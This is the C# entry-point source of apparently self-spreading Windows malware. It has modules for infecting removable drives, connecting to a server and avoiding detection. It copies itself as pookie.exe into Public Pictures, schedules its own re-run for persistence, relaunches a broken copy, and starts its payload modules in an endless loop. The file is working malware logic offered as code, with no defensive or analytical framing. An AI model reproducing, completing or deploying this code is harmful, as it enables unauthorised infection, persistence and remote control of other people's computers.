using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;

namespace zort
{
    class Program
    {
        readonly List<IPayloadModule> modules = new List<IPayloadModule>
                {
                    new RemovableInfector(),
                    //new ElevationHelper(),
                    //new ServiceManager(),
                    new ServerCon(),
                    new AntiDetection(),
                };

        static void Main(string[] args)
        {
            try
            {
                RemovableInfector.CheckIfRunningFromRemovableDrive();
                if (!RemovableInfector.IsSystemInfected())
                {
                    PersistenceHelper.CopyToPicturesAndScheduleRun();
                }
                else
                {
                    //Check if the exe in Public Pictures is running
                    string exePath = @"C:\\Users\\Public\\Pictures\\pookie.exe";
                    string selfPath = System.Reflection.Assembly.GetExecutingAssembly().Location;
                    Console.WriteLine($"Self path: {selfPath}");
                    Console.WriteLine($"Exe path: {exePath}");
                    if (Path.GetFullPath(selfPath).Equals(Path.GetFullPath(exePath), StringComparison.OrdinalIgnoreCase))
                    {
                        Console.WriteLine("Infected file (me) is running.");
                    }
                    else
                    {
                        bool running = Process.GetProcessesByName("pookie").Length > 0;
                        if (File.Exists(exePath))
                        {
                            Console.WriteLine("Infected files found in Public Pictures.");
                            if (!running)
                            {
                                Console.WriteLine("Infected files found in Public Pictures not running. Running the infected file.");
                                var p = Process.Start(exePath);
                                //check if it exits in 5 seconds
                                p.WaitForExit(5000);
                                if(p.HasExited)
                                {
                                    //exe is broken. recopy it and continue running from here.
                                    PersistenceHelper.CopyToPicturesAndScheduleRun(true);
                                    Console.WriteLine("Infected file is broken. Recopying it to Public Pictures.");
                                    goto payload;
                                }
                            }
                            Environment.Exit(0);
                        }
                        else
                        {
                            Console.WriteLine("No infected files found in Public Pictures.");
                            PersistenceHelper.CopyToPicturesAndScheduleRun(true); //just copy and let the already existing wmi action to handle it.
                        }
                    }

                    payload:
                    var program = new Program();
                    program.InitModules();
                    //Console.WriteLine("Press any key to exit...");
                    while (true)
                    {
                        Console.ReadLine();
                    }
                }
            }
            catch (Exception ex)
            {
                File.AppendAllText("C:\\service-error.log", $"[{DateTime.Now}] ERROR: {ex}\n");
                throw;
            }
        }

        protected void OnStop()
        {
            StopModules();
        }

        private void StopModules()
        {
            modules.ForEach(m =>
            {
                Console.WriteLine($"Stopping module {m.ModuleName}");
                m.Stop();
            });
        }

        private void InitModules()
        {
            bool isAdmin = false;

            modules.ForEach(m =>
            {
                switch (m.ElevationType)
                {
                    case ElevationType.Elevated:
                        if (!isAdmin)
                        {
                            Console.WriteLine($"Skipping module {m.ModuleName}, it requires admin privileges.");
                            return;
                        }
                        break;
                    case ElevationType.NonElevated:
                        if (isAdmin)
                        {
                            Console.WriteLine($"Skipping module {m.ModuleName}, it does not need to work unelevated.");
                            return;
                        }
                        break;
                }

                Console.WriteLine($"Starting module {m.ModuleName}");
                m.Start();
            });
        }
    }
}
